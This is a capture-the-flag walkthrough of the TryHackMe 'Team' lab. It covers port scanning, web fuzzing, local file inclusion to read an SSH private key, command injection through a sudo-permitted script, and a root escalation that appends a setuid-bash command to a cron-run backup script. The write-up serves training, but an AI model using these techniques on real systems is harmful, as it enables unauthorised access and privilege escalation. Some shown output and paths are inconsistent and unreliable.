# TryHackMe presents: Team
#### Nmap command:
```
nmap -sS -p- -n -Pn 10.65.182.32

```
#### Result:
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

#### Nmap command:
```
nmap 10.65.182.32 -sV -p 21,22,80
```

#### Results:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

1. Look for the index.html code, there you'll find a domain: team.thm.
2. Add to /etc/hosts file to access the site.
3. Access the site and fuzz it.
#### Fuzzing Command:
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://team.thm/FUZZ -ic
```
#### Results:
```
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 3005ms]
.hta                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 3903ms]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 3924ms]
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 129ms]
images                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 129ms]
index.html              [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 146ms]
robots.txt              [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 129ms]
scripts                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 128ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 129ms]

```
4. Fuzz the "scripts" directory looking for a .txt file:
```
ffuf -u http://team.thm/scripts/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -e .txt 
```
it results that when you add an extension when using the -e option, fuff uses the original words inside the wordlist and adds the extension to all the words.
4. There we find a bash script:
```
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in

```
Pay attention to the bottom comments we have important hints:
- **old script**

5. Now we have to fuzz with that data using the following command:
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://team.thm/scripts/FUZZ -e .bak,.old,.txt,.save,.zip -fs 273

```
There we will find the credentials for ftp.
6. Digging inside ftp, a message of a new site is found. Use .dev with the main domain.
7. Using the hint of the challenge: This is the hint you’re looking for: As the "dev" site is under contruction maybe it has some flaws? "url?=" + "This rooms picture"
8. The dev site has a link which redirects to this URL: http://dev.team.thm/script.php?page=teamshare.php
9. We have to apply the LFI(Local File Inclusion) vulnerability on the parameters.
10. There was discovered that you can directly fuzz for directories right in the parameters.
Note: Fuzz parameters using the Jhadix LFI fuzzing wordlist.
11. Once you've fuzzed a lot of results will appear, focus on **/etc/ssh/ssh_config** directory.
12. Use this location after the parameter on the URL, then copy the ssh private key.
**Note:** Use the code source view to copy the key correctly, then use this command:
```bash
sed 's/^#//' to remove the "#", this is because the "#" are not suppossed to be on a key.
```
13. Now login into ssh using dale user: ssh dale@<machineIP> -i <name of the key file>.
14. There you'll find the **user.txt** flag.
15. Now we analyze the hint we have to find the root flag: "Is root running anything automated? ps I like PATH s"
16. On the user "dale" session execute the command **sudo -l** to see which commands can the user execute.
17. The command's result shows:
```bash
Matching Defaults entries for dale on ip-10-65-168-135:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-65-168-135:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

Pay attention to the line: **(gyles) NOPASSWD: /home/gyles/admin_checks**
This means that when dale runs the command **/home/gyles/admin_checks** it will be executed as "gyles" user.
18. Lets see the content of the script **"admin_checks"**:
```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

In short the script is a simple backup logging tool. But, there's a command injection vulnerability inside it.
The vulnerable line is: $error 2>/dev/null
#### Why is it vulnerable?
The script takes input from the user:
read -p "Enter 'date' to timestamp the file: " error
and stores it in the varible error.
Then it executes the contents of the variable as a command: $error
The command intended is "date" but if you enter whoami the script runs the command whoami.
19. So we execute the script as user gyles:
```
sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: fernand #Here you enter any string
Enter 'date' to timestamp the file: bash # Here you enter a command(in this case "bash" to open a terminal with the user **gyles**)
The Date is whoami
gyles

```
20. Using id command we see the next result:
```
id
uid=1001(gyles) ... groups=admin,lxd,editors
```
user gyles is on admin group.

21. What files does the group can modify?
```
Using the command: find / -group admin 2>/dev/null

Result:
/usr/local/bin
/usr/local/bin/main_backup.sh

# Analyze it:
ls -l /usr/local/bin/main_backup.sh

-rwxrwxr-x 1 root admin ...

root: owner
admin: group
rwx: permissions for admin group

# Content of the file:
cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/

# This is a backup script
```

22. We have to figure out if the script is ran automatically:
```
grep -R "main_backup.sh" /etc 2>/dev/null
cat /etc/crontab

# Inside we find:
/opt/admin_stuff/script.sh
```

23. As we are allowed to edit the file we inject code into it:
```
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /usr/local/bin/main_backup.sh
```
After cron runs /tmp/root/bash -p we will have root access!!!

24. Look for root flag.
